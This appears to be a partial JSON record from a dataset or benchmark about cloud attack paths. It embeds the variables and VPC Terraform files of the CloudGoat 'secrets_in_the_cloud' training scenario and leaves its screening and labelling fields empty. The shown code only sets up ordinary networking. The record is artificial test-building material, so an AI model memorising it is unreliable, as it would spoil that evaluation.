+      "text": "variable \"profile\" {\r\n  description = \"The AWS profile to use when deploying resources\"\r\n  type        = string\r\n}\r\n\r\nvariable \"region\" {\r\n  description = \"The AWS region to deploy resources into\"\r\n  default     = \"us-east-1\"\r\n  type        = string\r\n}\r\n\r\nvariable \"cgid\" {\r\n  description = \"CGID variable for unique naming between scenarios\"\r\n  type        = string\r\n}\r\n\r\nvariable \"cg_whitelist\" {\r\n  description = \"User's public IP address(es)\"\r\n  type        = list(string)\r\n}\r\n\r\nvariable \"stack-name\" {\r\n  description = \"Name of the stack\"\r\n  default     = \"CloudGoat\"\r\n  type        = string\r\n}\r\n\r\nvariable \"scenario-name\" {\r\n  description = \"Name of the scenario being deployed\"\r\n  default     = \"scenario_template\"\r\n  type        = string\r\n}\r\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/vpc.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/secrets_in_the_cloud/terraform/vpc.tf",
+      "member_sha256": "b7324a9a394fb190cb8c229d305e245cde1f88d6b825b8d4079e0dd7f7fcc6f1",
+      "bytes": 987,
+      "content_kind": "tf",
+      "text": "resource \"aws_vpc\" \"vpc\" {\n  cidr_block = \"10.0.0.0/16\"\n  tags = {\n    Name = \"cg-vpc-${var.cgid}\"\n  }\n}\n\nresource \"aws_internet_gateway\" \"igw\" {\n  vpc_id = aws_vpc.vpc.id\n  tags = {\n    Name = \"cg-igw-${var.cgid}\"\n  }\n}\n\nresource \"aws_subnet\" \"subnet\" {\n  vpc_id                  = aws_vpc.vpc.id\n  cidr_block              = \"10.0.1.0/24\"\n  availability_zone       = \"us-east-1a\" # or dynamically get a random availability zone\n  map_public_ip_on_launch = true\n  tags = {\n    Name = \"cg-subnet-${var.cgid}\"\n  }\n}\n\nresource \"aws_route_table\" \"route_table\" {\n  vpc_id = aws_vpc.vpc.id\n  tags = {\n    Name = \"cg-route-table-${var.cgid}\"\n  }\n}\n\nresource \"aws_route\" \"route\" {\n  route_table_id         = aws_route_table.route_table.id\n  destination_cidr_block = \"0.0.0.0/0\"\n  gateway_id             = aws_internet_gateway.igw.id\n}\n\nresource \"aws_route_table_association\" \"route_table_association\" {\n  subnet_id      = aws_subnet.subnet.id\n  route_table_id = aws_route_table.route_table.id\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    }
+  ],
+  "runtime_instances": [],
+  "source_context_fields": [
+    "candidate_metadata",
+    "runtime_instances",
+    "source",
+    "source_materials"
+  ],
+  "source_context_sha256": "d6cd3534cfe8adc01f9fdbaa19ab3d9c64cf21926a8e6e82453963c87a87e6e7",
+  "admission_screen": {
+    "external_or_low_privilege_entry_defined": null,
+    "multi_step_path_present": null,
+    "cloud_data_target_present": null,
+    "critical_edges_have_raw_evidence": null,
+    "not_a_near_duplicate": null,
+    "decision": null,
+    "rationale": null
+  },
+  "nodes": [],
+  "edges": [],
+  "path_labels": [],
+  "tool_tasks": [],
+  "instance_labels": []
+}
